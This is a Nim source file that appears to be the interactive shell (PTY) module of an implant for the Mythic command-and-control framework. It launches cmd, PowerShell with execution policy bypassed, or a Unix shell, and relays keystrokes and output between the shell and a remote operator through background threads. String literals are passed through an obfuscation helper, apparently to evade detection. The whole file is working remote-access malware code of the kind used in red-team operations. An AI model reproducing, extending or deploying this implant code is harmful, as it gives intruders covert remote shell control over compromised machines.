import std/[json, os, osproc, strutils, base64, strformat]
import ../utils/m_responses
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import winim/lean
else:
  import posix

# PTY Message Types (must match Python/Mythic definitions)
type
  PtyMessageType* = enum
    Input = 0
    Output = 1
    Error = 2
    Exit = 3
    Escape = 4
    CtrlA = 5
    CtrlB = 6
    CtrlC = 7
    CtrlD = 8
    CtrlE = 9
    CtrlF = 10
    CtrlG = 11
    Backspace = 12
    Tab = 13
    CtrlK = 14
    CtrlL = 15
    CtrlN = 16
    CtrlP = 17
    CtrlQ = 18
    CtrlR = 19
    CtrlS = 20
    CtrlU = 21
    CtrlW = 22
    CtrlY = 23
    CtrlZ = 24

  Interactive* = object
    task_id*: string
    message_type*: uint8
    data*: string  # base64 encoded
  
  # Thread data structure - uses raw OS handles for thread safety
  ThreadData = object
    when defined(windows):
      stdoutHandle: HANDLE
      stdinHandle: HANDLE
    else:
      stdoutFd: cint
      stdinFd: cint
    active: bool
    outputChan: ptr Channel[string]
    inputChan: ptr Channel[string]
  
  PtySession* = ref object
    taskId*: string
    process*: Process
    program*: string
    active*: bool
    threadData*: ptr ThreadData
    readerThread*: Thread[ptr ThreadData]
    writerThread*: Thread[ptr ThreadData]

var activePtySessions*: seq[PtySession] = @[]

when defined(windows):
  proc outputReaderThread(data: ptr ThreadData) {.thread.} =
    ## Windows: Read from stdout handle in background thread
    var buffer: array[4096, char]
    var bytesRead: DWORD
    
    while data[].active:
      # This blocks but only in the thread
      let success = ReadFile(data[].stdoutHandle, addr buffer[0], 4096, addr bytesRead, nil)
      
      if success != 0 and bytesRead > 0:
        # Send output to main thread
        var output = newString(bytesRead)
        copyMem(addr output[0], addr buffer[0], bytesRead)
        data[].outputChan[].send(output)
      elif bytesRead == 0:
        # EOF or pipe broken
        break
      else:
        # Error
        sleep(10)
    
    data[].outputChan[].send("")  # Signal EOF
  
  proc inputWriterThread(data: ptr ThreadData) {.thread.} =
    ## Windows: Write to stdin handle from input queue
    while data[].active:
      let (available, input) = data[].inputChan[].tryRecv()
      if available and input.len > 0:
        var bytesWritten: DWORD
        discard WriteFile(data[].stdinHandle, unsafeAddr input[0], input.len.DWORD, addr bytesWritten, nil)
      else:
        sleep(10)  # Don't spin too hard

else:
  proc outputReaderThread(data: ptr ThreadData) {.thread.} =
    ## Unix: Read from stdout fd in background thread
    var buffer: array[4096, char]
    
    while data[].active:
      # This blocks but only in the thread
      let bytesRead = posix.read(data[].stdoutFd, addr buffer[0], 4096)
      
      if bytesRead > 0:
        # Send output to main thread
        var output = newString(bytesRead)
        copyMem(addr output[0], addr buffer[0], bytesRead)
        data[].outputChan[].send(output)
      elif bytesRead == 0:
        # EOF
        break
      else:
        # Error or would block
        sleep(10)
    
    data[].outputChan[].send("")  # Signal EOF
  
  proc inputWriterThread(data: ptr ThreadData) {.thread.} =
    ## Unix: Write to stdin fd from input queue
    while data[].active:
      let (available, input) = data[].inputChan[].tryRecv()
      if available and input.len > 0:
        discard posix.write(data[].stdinFd, unsafeAddr input[0], input.len)
      else:
        sleep(10)  # Don't spin too hard

proc createInteractiveMessage*(taskId: string, msgType: PtyMessageType, data: string): JsonNode =
  ## Create an interactive message to send to Mythic
  result = %*{
    obf("task_id"): taskId,
    obf("message_type"): ord(msgType),
    obf("data"): encode(data)
  }

proc pty*(taskId: string, params: JsonNode): JsonNode =
  ## Start a PTY session with the specified program
  try:
    # Parse parameters
    let program = params[obf("program")].getStr()
    
    debug &"[DEBUG] Starting PTY with program: {program}"
    
    # Determine program arguments based on type
    var args: seq[string] = @[]
    let progLower = program.toLowerAscii()
    
    when defined(windows):
      if obf("cmd") in progLower:
        args = @[obf("/Q"), obf("/D")]
      elif obf("powershell") in progLower or obf("pwsh") in progLower:
        args = @[obf("-NoLogo"), obf("-NoProfile"), obf("-ExecutionPolicy"), obf("Bypass")]
    else:
      # For Linux shells, use non-interactive mode for cleaner output
      discard
    
    # Start the process
    let process = startProcess(
      program,
      args = args,
      options = {poUsePath, poStdErrToStdOut}
    )
    
    # Create channels for thread communication
    var outputChan = cast[ptr Channel[string]](allocShared0(sizeof(Channel[string])))
    var inputChan = cast[ptr Channel[string]](allocShared0(sizeof(Channel[string])))
    outputChan[].open()
    inputChan[].open()
    
    # Get raw OS handles/file descriptors
    var threadData = cast[ptr ThreadData](allocShared0(sizeof(ThreadData)))
    threadData[].active = true
    threadData[].outputChan = outputChan
    threadData[].inputChan = inputChan
    
    when defined(windows):
      # Get Windows handles from Process
      threadData[].stdoutHandle = process.outputHandle
      threadData[].stdinHandle = process.inputHandle
    else:
      # Get Unix file descriptors
      threadData[].stdoutFd = process.outputHandle.FileHandle
      threadData[].stdinFd = process.inputHandle.FileHandle
    
    # Create PTY session
    var session = PtySession(
      taskId: taskId,
      process: process,
      program: program,
      active: true,
      threadData: threadData
    )
    
    # Start both reader and writer threads
    createThread(session.readerThread, outputReaderThread, threadData)
    createThread(session.writerThread, inputWriterThread, threadData)
    
    activePtySessions.add(session)
    
    debug &"[DEBUG] PTY session started for task {taskId} with background thread"
    
    # Return initial response indicating we're ready for interaction
    result = mythicSuccess(taskId, obf("PTY session started successfully") & obf(" with program: ") & program)
    result[obf("completed")] = %false
    result[obf("status")] = %obf("processing")
    return result
    
  except:
    let e = getCurrentException()
    return mythicError(taskId, obf("Error starting PTY: ") & e.msg)

proc handlePtyInteractive*(taskId: string, interactive: seq[JsonNode]): JsonNode =
  # Find the session for this task
  var session: PtySession = nil
  for s in activePtySessions:
    if s.taskId == taskId and s.active:
      session = s
      break
  
  if session == nil:
    return %*{
      obf("task_id"): taskId,
      obf("user_output"): obf("Error: PTY session not found"),
      obf("completed"): %true,
      obf("status"): "error"
    }
  
  var interactiveMessages: seq[JsonNode] = @[]
  
  try:
    # Handle input messages
    for msg in interactive:
      let msgType = PtyMessageType(msg[obf("message_type")].getInt())
      let data = if msg.hasKey(obf("data")) and msg[obf("data")].kind != JNull:
                  decode(msg[obf("data")].getStr())
                else:
                  ""
      
      case msgType
      of Input:
        # Send input to thread via channel
        if data.len > 0:
          debug &"[DEBUG] PTY input: {data}"
          
          session.threadData[].inputChan[].send(data)
          
          # Check for exit command
          let inputLower = data.strip().toLowerAscii()
          if inputLower == obf("exit") or inputLower == obf("exit\n"):
            session.active = false
            session.threadData[].active = false
            session.process.terminate()
            interactiveMessages.add(createInteractiveMessage(taskId, Output, obf("Exiting PTY session...\n")))
            return %*{
              obf("task_id"): taskId,
              obf("interactive"): interactiveMessages
            }
      
      of Exit:
        # Terminate the PTY session
        debug &"[DEBUG] PTY exit requested"
        
        session.active = false
        session.threadData[].active = false
        session.threadData[].inputChan[].send(obf("exit\n"))
        sleep(100)
        session.process.terminate()
        interactiveMessages.add(createInteractiveMessage(taskId, Output, obf("PTY session terminated\n")))
      
      of Escape, CtrlA, CtrlB, CtrlC, CtrlD, CtrlE, CtrlF, CtrlG, Backspace, Tab, 
         CtrlK, CtrlL, CtrlN, CtrlP, CtrlQ, CtrlR, CtrlS, CtrlU, CtrlW, CtrlY, CtrlZ:
        # Handle special characters
        let charByte = case msgType
          of Escape: 0x1B
          of Backspace: 0x08
          of Tab: 0x09
          of CtrlA: 0x01
          of CtrlB: 0x02
          of CtrlC: 0x03
          of CtrlD: 0x04
          of CtrlE: 0x05
          of CtrlF: 0x06
          of CtrlG: 0x07
          of CtrlK: 0x0B
          of CtrlL: 0x0C
          of CtrlN: 0x0E
          of CtrlP: 0x10
          of CtrlQ: 0x11
          of CtrlR: 0x12
          of CtrlS: 0x13
          of CtrlU: 0x15
          of CtrlW: 0x17
          of CtrlY: 0x19
          of CtrlZ: 0x1A
          else: 0x00
        
        if charByte != 0:
          session.threadData[].inputChan[].send($chr(charByte))
      
      else:
        discard
    
    # Check for output from thread (non-blocking)
    var (hasOutput, output) = session.threadData[].outputChan[].tryRecv()
    while hasOutput:
      if output.len == 0:
        # EOF signal from thread
        session.active = false
        interactiveMessages.add(createInteractiveMessage(taskId, Exit, obf("Process terminated\n")))
        break
      
      debug &"[DEBUG] PTY output: {output}"
      
      interactiveMessages.add(createInteractiveMessage(taskId, Output, output))
      
      # Check for more output
      (hasOutput, output) = session.threadData[].outputChan[].tryRecv()
    
    # Check if process has exited
    if not session.process.running():
      session.active = false
      session.threadData[].active = false
      if interactiveMessages.len == 0:
        interactiveMessages.add(createInteractiveMessage(taskId, Exit, obf("Process terminated\n")))
      
      # Remove from active sessions
      var newSessions: seq[PtySession] = @[]
      for s in activePtySessions:
        if s.taskId != taskId:
          newSessions.add(s)
      activePtySessions = newSessions
    
    # Return response with interactive messages
    if interactiveMessages.len > 0:
      return %*{
        obf("task_id"): taskId,
        obf("interactive"): interactiveMessages
      }
    else:
      return %*{}
      
  except:
    let e = getCurrentException()
    session.active = false
    session.threadData[].active = false
    return %*{
      obf("task_id"): taskId,
      obf("user_output"): &"PTY error: {e.msg}",
      obf("completed"): true,
      obf("status"): "error"
    }

proc checkActivePtySessions*(): seq[JsonNode] =
  ## Check all active PTY sessions for output from their threads
  ## Returns array of responses with interactive messages
  result = @[]
  for session in activePtySessions:
    if session.active:
      let response = handlePtyInteractive(session.taskId, @[])
      if response.hasKey(obf("interactive")):
        result.add(response)
